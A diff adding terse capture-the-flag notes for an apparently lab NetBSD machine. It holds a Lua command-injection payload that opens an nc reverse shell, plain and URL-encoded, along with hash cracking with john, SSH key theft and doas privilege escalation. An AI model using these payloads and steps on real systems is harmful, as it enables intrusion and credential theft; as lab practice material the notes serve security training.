@@ -1,0 +1,29 @@
+//Based on bertolis & Andy74(Secjuice)
+10.10.10.218:9001 -> Supervisor
+//supervisor default creds
+user : 123
+//processes: /usr/local/webapi/weather.lua
+gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.10.218/weather -o gobuster_weather.txt	//weather came from nmap, robots.txt
+http://10.10.10.218/weather/forecast?city=list
+curl -v "http://10.10.10.218/weather/forecast?city=')+os.execute('id')+--"
+curl -v "http://10.10.10.218/weather/forecast?city=')+os.execute('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.38 9001 >/tmp/f')+--"
+curl -v "http://10.10.10.218/weather/forecast?city=')+os.execute('%72%6d%20%2f%74%6d%70%2f%66%3b%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%66%3b%63%61%74%20%2f%74%6d%70%2f%66%7c%2f%62%69%6e%2f%73%68%20%2d%69%20%32%3e%26%31%7c%6e%63%20%31%30%2e%31%30%2e%31%34%2e%33%38%20%39%30%30%31%20%3e%2f%74%6d%70%2f%66')+--"	//got shell
+cat .htpasswd
+john --wordlist=/usr/share/wordlists/rockyou.txt hash
+webapi_user : iamthebest
+curl --user "webapi_user:iamthebest" http://10.10.10.218
+curl --user "webapi_user:iamthebest" -v "http://127.0.0.1:3001/~r.michaels/"
+curl --user "webapi_user:iamthebest" -v "http://127.0.0.1:3001/~r.michaels/id_rsa"	//got private key
+chmod 600 id_rsa
+ssh -i id_rsa r.michaels@10.10.10.218		//got user
+Welcome to NetBSD!
+/home/r.michaels/backups/devel_backup-2020-09-16.tar.gz.enc
+decrypt enc file netbsd
+netpgp --decrypt /home/r.michaels/backups/devel_backup-2020-09-16.tar.gz.enc --output /tmp/devel_backup-2020-09-16.tar.gz
+tar -zxvf devel_backup-2020-09-16.tar.gz
+cat www/.htpasswd
+webapi_user:$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.
+john --wordlist=/usr/share/wordlists/rockyou.txt hash2
+root : littlebear
+doas -u root cat /root/root.txt
+doas sh						//go root
